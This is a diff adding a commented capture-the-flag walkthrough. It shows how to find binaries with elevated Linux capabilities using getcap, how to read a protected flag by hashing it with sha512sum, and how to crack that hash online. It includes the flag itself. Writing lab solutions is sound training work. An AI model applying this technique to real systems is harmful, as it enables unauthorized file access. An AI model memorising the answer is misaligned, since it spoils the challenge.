@@ -1,0 +1,20 @@
+# Use ssh to connect to ctf@CTF_HOST. Use CTF_PASSWORD as the account
+# password. The task is to get the flag from the /home/ctf/flag file.
+
+# Use the command:
+#	ctf@owasp-ctf-19:~$ /sbin/getcap -r / 2> /dev/null
+#
+# And you get:
+#	/usr/bin/sha512sum = cap_dac_read_search+ep
+#	/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
+#	/bin/ping = cap_net_raw+ep
+#	/bin/ping6 = cap_net_raw+ep
+#
+# So just get the hash of the contents within the flag file:
+#	ctf@owasp-ctf-19:~$ /usr/bin/sha512sum flag
+#
+# And you get:
+#	07d09de4a087e9342188a82251330615c8cb8927c2b93cb14881dad2205de9ff50acfad8b5958ef30858efc2bb2096c2a3c361eb134582efc653d9e5ff4b4f8d  flag
+#
+# Then head over to crackstation.net and get:
+#	07d09de4a087e9342188a82251330615c8cb8927c2b93cb14881dad2205de9ff50acfad8b5958ef30858efc2bb2096c2a3c361eb134582efc653d9e5ff4b4f8d	sha512	all your base are belong to us
